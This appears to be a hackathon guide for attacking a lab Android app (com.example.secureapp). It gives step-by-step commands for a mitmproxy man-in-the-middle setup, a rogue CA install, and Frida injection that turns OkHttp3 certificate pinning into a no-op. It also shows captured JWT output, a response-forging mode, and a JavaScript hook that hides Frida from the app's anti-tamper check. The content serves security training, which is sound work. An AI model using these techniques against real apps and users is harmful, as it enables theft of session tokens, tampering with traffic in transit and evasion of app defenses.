# Hackathon #31 — Attacker Implementation Guide
## TLS Certificate Pinning Bypass & MitM Attack

---

## 📁 Project Structure

```
attacker/
├── mitm/
│   ├── intercept_addon.py       ← mitmproxy plugin (logs all traffic)
│   ├── attack_orchestrator.py   ← Single-command launcher for all steps
│   └── report_generator.py     ← HTML report builder
├── frida-scripts/
│   └── bypass_pinning.js        ← Frida hook (OkHttp + TrustManager bypass)
├── cert-tools/
│   └── cert_extractor.py        ← SPKI pin extractor / cert analyser
├── dashboard/
│   └── dashboard.py             ← Live Flask dashboard at :5001
└── docs/
    └── ATTACK_GUIDE.md          ← This file
```

---

## 🎯 What the Attack Does

The target app (`com.example.secureapp`) uses **OkHttp3 CertificatePinner**
which hardens standard TLS by requiring the server's public key to match a
hardcoded SHA-256 fingerprint (`sha256/+9PiUJGaE6FNwbbs1sy9nsEy5cn+yWpE+zDZJKBSUYw=`).

Even if you route traffic through mitmproxy, the app will **throw
`CertificatePinningException`** because mitmproxy's dynamically-generated
certificate doesn't match that pin.

**Our bypass:** Frida hooks `CertificatePinner.check()` at runtime and turns
it into a no-op — so the app never throws. Combined with mitmproxy as a
transparent TLS proxy, we get full plaintext access to:

- The secret JWT token from `/login`
- All request/response headers
- Server certificate details

---

## 🔧 Installation

### 1. Python dependencies

```bash
pip install mitmproxy cryptography flask frida-tools
```

### 2. Get Frida server for your emulator ABI

```bash
# Check emulator ABI
adb shell getprop ro.product.cpu.abi
# → x86_64  (typical for AVD)

# Download matching frida-server from:
# https://github.com/frida/frida/releases
# Pick frida-server-<version>-android-x86_64.xz

xz -d frida-server-*.xz
mv frida-server-* frida-server
```

### 3. Push Frida server to emulator

```bash
adb push frida-server /data/local/tmp/
adb shell "chmod 755 /data/local/tmp/frida-server"
```

---

## 🚀 Running the Attack (Step by Step)

### Step 1 — Start the target backend server

```bash
cd cyber/backend
pip install flask cryptography
python3 server.py
# Runs on https://0.0.0.0:5000 with the self-signed cert
```

### Step 2 — Start mitmproxy

```bash
cd attacker/mitm
mitmdump -s intercept_addon.py --ssl-insecure -p 8080
```

You'll see:
```
[INTERCEPT] ▶ GET https://10.0.2.2:5000/login
[INTERCEPT] ◀ 200 https://10.0.2.2:5000/login
  BODY: {"status":"authenticated","username":"admin","token":"secret-jwt-token-abcd1234efgh"}
```

### Step 3 — Install mitmproxy CA cert on emulator

```bash
# The CA cert is auto-generated on first mitmproxy run
adb push ~/.mitmproxy/mitmproxy-ca-cert.pem /sdcard/

# On emulator:
# Settings → Security & location → Encryption & credentials
# → Install a certificate → CA certificate → select mitmproxy-ca-cert.pem
```

### Step 4 — Set emulator proxy

```bash
adb shell settings put global http_proxy 127.0.0.1:8080
```

Or manually in the emulator:  
Settings → WiFi → long-press network → Modify → Advanced → Proxy: Manual  
Host: `10.0.2.2`, Port: `8080`

### Step 5 — Start Frida server on emulator

```bash
adb shell "/data/local/tmp/frida-server &"
```

### Step 6 — Inject Frida bypass into the app

```bash
# Make sure the app is already open on the emulator, then:
frida -U -n com.example.secureapp -s attacker/frida-scripts/bypass_pinning.js

# OR: spawn-inject (starts app fresh with hooks already in place)
frida -U -f com.example.secureapp -s attacker/frida-scripts/bypass_pinning.js --no-pause
```

Expected Frida output:
```
[FRIDA] [INIT] Java.perform() running — hooks installing...
[FRIDA] [OkHttp3] CertificatePinner hooked successfully!
[FRIDA] [TrustManager] Permissive TrustManager installed!
[FRIDA] [HostnameVerifier] Hostname verifier hooked!
[FRIDA] [AntiDetect] Frida memory-map detection bypass active!
[FRIDA] [Spy] OkHttp request spy installed!
[FRIDA] [INIT] All hooks installed. Waiting for app to make HTTPS calls...

# When user taps "Send Secure HTTPS Request" in the app:
[FRIDA] [OkHttp3] check() called for hostname: 10.0.2.2
[FRIDA] [OkHttp3] ✓ Bypassed — returning without throwing
[FRIDA] [TrustManager] checkServerTrusted() called — accepting cert
```

### Step 7 — Open the live dashboard

```bash
cd attacker/dashboard
python3 dashboard.py
# → http://localhost:5001
```

### Step 8 — Tap the button in the app

Tap **"Send Secure HTTPS Request"** in the Android app. You'll see in mitmproxy:

```json
{
  "status": "authenticated",
  "username": "admin",
  "token": "secret-jwt-token-abcd1234efgh"
}
```

The JWT token is now **completely exposed** to the attacker.

### Step 9 — Generate HTML report

```bash
python3 attacker/mitm/report_generator.py
# → attacker/reports/attack_report_<timestamp>.html
```

---

## 🛠 One-Command Mode

Run everything from a single script:

```bash
python3 attacker/mitm/attack_orchestrator.py --target 10.0.2.2 --port 5000
```

Individual steps:
```bash
python3 attack_orchestrator.py --step 1   # cert analysis only
python3 attack_orchestrator.py --step 2   # start mitmproxy only
python3 attack_orchestrator.py --step 4   # frida inject only
python3 attack_orchestrator.py --report-only  # generate report from existing log
```

---

## 🧪 Certificate Analysis Tool

```bash
# Live extraction from running server:
python3 attacker/cert-tools/cert_extractor.py --host 10.0.2.2 --port 5000

# Analyse the existing PEM:
python3 attacker/cert-tools/cert_extractor.py --pem cyber/certificates/cert.pem

# Analyse mitmproxy CA (for device installation):
python3 attacker/cert-tools/cert_extractor.py --mitmproxy-ca ~/.mitmproxy/mitmproxy-ca-cert.pem

# JSON output only:
python3 attacker/cert-tools/cert_extractor.py --pem cert.pem --json
```

---

## ⚡ Response Tampering (Bonus Demo)

The intercept addon supports **live response injection**. To enable:

```python
# In attacker/mitm/intercept_addon.py, change:
INJECT_MODE = True
```

When active, any `/login` response will have its token replaced with:
```json
{"token": "ATTACKER-FORGED-TOKEN-evil0000", "_injected": true}
```

This demonstrates that the attacker can not only **read** but also
**modify** traffic in transit.

---

## 🔬 How Frida Bypasses Anti-Frida Detection

The target app reads `/proc/self/maps` looking for the string `"frida"`.  
Our script hooks `BufferedReader.readLine()` and returns `null` whenever
a line contains "frida" — effectively hiding the Frida agent from detection.

```javascript
BufferedReader.readLine.implementation = function () {
    const line = this.readLine();
    if (line && line.toLowerCase().indexOf("frida") !== -1) {
        return null;   // pretend this line doesn't exist
    }
    return line;
};
```

---

## 📋 Hackathon Deliverables Checklist

| Requirement | File | Status |
|---|---|---|
| TLS MitM proxy (mitmproxy) | `mitm/intercept_addon.py` | ✅ |
| Certificate pinning bypass (Frida) | `frida-scripts/bypass_pinning.js` | ✅ |
| OkHttp3 hook | bypass_pinning.js → hook #1 | ✅ |
| TrustManager bypass | bypass_pinning.js → hook #2 | ✅ |
| Anti-Frida evasion | bypass_pinning.js → hook #4 | ✅ |
| SPKI pin extractor | `cert-tools/cert_extractor.py` | ✅ |
| Traffic logging to JSON | `intercept_addon.py` → LOG_FILE | ✅ |
| Response tampering demo | `intercept_addon.py` → INJECT_MODE | ✅ |
| Live dashboard | `dashboard/dashboard.py` | ✅ |
| HTML attack report | `mitm/report_generator.py` | ✅ |
| Full orchestration | `mitm/attack_orchestrator.py` | ✅ |
| MITRE ATT&CK mapping | T1557 + T1040 + T1574 | ✅ |
